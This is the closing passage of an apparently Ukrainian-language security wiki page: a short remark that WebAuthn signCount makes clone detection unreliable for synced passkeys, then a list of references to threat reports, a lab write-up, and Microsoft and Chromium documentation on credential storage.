- Пам’ятайте, що WebAuthn **`signCount`** часто не є корисним для синхронізованих passkeys, оскільки його значення може залишатися незмінним, тому класичне виявлення клонування є ненадійним.

## References

- [1] [Unit 42 – Розслідування багаторічних невиявлених операцій, спрямованих на критично важливі сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Усередині Ink Dragon: розкриття мережі ретрансляції та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова поверхня атаки в автентифікації без паролів](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / зберігання ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Злам Windows: атаки на системи та мережі Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: усередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Віддалене отримання дампа паролів Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho розширює арсенал кіберз шпигунства за допомогою набору інструментів Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функція CreateFileW і `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – режим резервного копіювання Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegram – завершення активних сеансів](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
